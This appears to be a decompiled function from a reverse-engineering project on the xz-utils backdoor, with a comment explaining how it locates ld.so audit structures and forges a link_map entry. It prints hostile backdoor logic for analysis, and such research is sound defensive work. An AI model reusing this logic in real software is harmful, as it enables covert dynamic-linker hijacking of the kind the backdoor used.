// /home/kali/xzre-ghidra/xzregh/1051E0_find_dl_audit_offsets.c
// Function: find_dl_audit_offsets @ 0x1051E0
// Calling convention: unknown
// Prototype: undefined find_dl_audit_offsets(void)


/*
 * AutoDoc: Drives the full ld.so preparation sequence: resolves several EC/EVP helpers, maps
 * `_dl_audit_symbind_alt`, finds the `l_name` displacement, extracts `_dl_naudit/_dl_audit`, and
 * finally discovers the `l_audit_any_plt` byte plus its mask. It also copies the basename of
 * libcrypto into `hooks->ldso_ctx` so the forged link_map name matches the original string.
 */
#include "xzre_types.h"


undefined8 find_dl_audit_offsets(long param_1,undefined8 *param_2,undefined4 *param_3,long param_4)

{
  uint uVar1;
  undefined8 uVar2;
  long lVar3;
  int iVar4;
  long lVar5;
  long lVar6;
  long lVar7;
  undefined4 *puVar8;
  byte bVar9;
  
  bVar9 = 0;
  iVar4 = secret_data_append_from_call_site(0,10,0,0);
  if (iVar4 != 0) {
    lVar5 = get_lzma_allocator(1);
    uVar2 = *(undefined8 *)(*(long *)(param_1 + 8) + 0x20);
    *(undefined8 *)(lVar5 + 0x10) = uVar2;
    lVar6 = elf_symbol_get(uVar2,0x6e0,0);
    if (*(int *)(*(long *)(*(long *)(param_1 + 8) + 0x18) + 0x4c) != 0) {
      if (lVar6 != 0) {
        lVar6 = *(long *)(lVar6 + 8);
        lVar7 = **(long **)(*(long *)(param_1 + 8) + 0x20);
        *(int *)(param_4 + 0x120) = *(int *)(param_4 + 0x120) + 1;
        *(long *)(param_4 + 0x40) = lVar6 + lVar7;
      }
      lVar6 = lzma_alloc(0x6f8,lVar5);
      *(long *)(param_4 + 0x98) = lVar6;
      if (lVar6 != 0) {
        *(int *)(param_4 + 0x120) = *(int *)(param_4 + 0x120) + 1;
      }
      lVar6 = elf_symbol_get(*(undefined8 *)(*(long *)(param_1 + 8) + 0x20),0x268,0);
      lVar7 = lzma_alloc(0x7e8,lVar5);
      *(long *)(param_4 + 0x50) = lVar7;
      if (lVar7 != 0) {
        *(int *)(param_4 + 0x120) = *(int *)(param_4 + 0x120) + 1;
      }
      lVar7 = *(long *)(param_1 + 8);
      if (lVar6 != 0) {
        lVar6 = *(long *)(lVar6 + 8);
        lVar3 = **(long **)(lVar7 + 0x20);
        *(int *)(param_4 + 0x120) = *(int *)(param_4 + 0x120) + 1;
        *(long *)(param_4 + 0x48) = lVar6 + lVar3;
      }
      lVar6 = elf_symbol_get(*(undefined8 *)(lVar7 + 8),0x9c8,0);
      if (lVar6 != 0) {
        lVar7 = *(long *)(lVar6 + 8);
        lVar3 = **(long **)(*(long *)(param_1 + 8) + 8);
        *(undefined8 *)(param_3 + 0x42) = *(undefined8 *)(lVar6 + 0x10);
        *(long *)(param_3 + 0x40) = lVar7 + lVar3;
        iVar4 = elf_contains_vaddr();
        if ((iVar4 != 0) &&
           (iVar4 = find_link_map_l_name(param_1,param_2,param_3,param_4), iVar4 != 0)) {
          lVar6 = lzma_alloc(0xb28,lVar5);
          *(long *)(param_4 + 0xc0) = lVar6;
          if (lVar6 != 0) {
            *(int *)(param_4 + 0x120) = *(int *)(param_4 + 0x120) + 1;
          }
          iVar4 = find_dl_naudit(*(undefined8 *)(*(long *)(param_1 + 8) + 8),
                                 *(undefined8 *)(*(long *)(param_1 + 8) + 0x20),param_3,param_4);
          if ((iVar4 != 0) &&
             (iVar4 = find_link_map_l_audit_any_plt(param_1,*param_2,param_3,param_4), iVar4 != 0))
          {
            puVar8 = param_3;
            for (lVar6 = 0x10; lVar6 != 0; lVar6 = lVar6 + -1) {
              *puVar8 = 0;
              puVar8 = puVar8 + (ulong)bVar9 * -2 + 1;
            }
            uVar1 = *(uint *)(*(long **)(param_3 + 0x3e) + 1);
            if (uVar1 < 9) {
              if (uVar1 != 0) {
                lVar5 = **(long **)(param_3 + 0x3e);
                lVar6 = 0;
                do {
                  *(undefined1 *)((long)param_3 + lVar6) = *(undefined1 *)(lVar5 + lVar6);
                  lVar6 = lVar6 + 1;
                } while ((ulong)uVar1 << 3 != lVar6);
              }
              return 1;
            }
          }
        }
      }
    }
    lzma_free(*(undefined8 *)(param_4 + 0x98),lVar5);
    lzma_free(*(undefined8 *)(param_4 + 0x50),lVar5);
    lzma_free(*(undefined8 *)(param_4 + 0xc0),lVar5);
  }
  return 0;
}

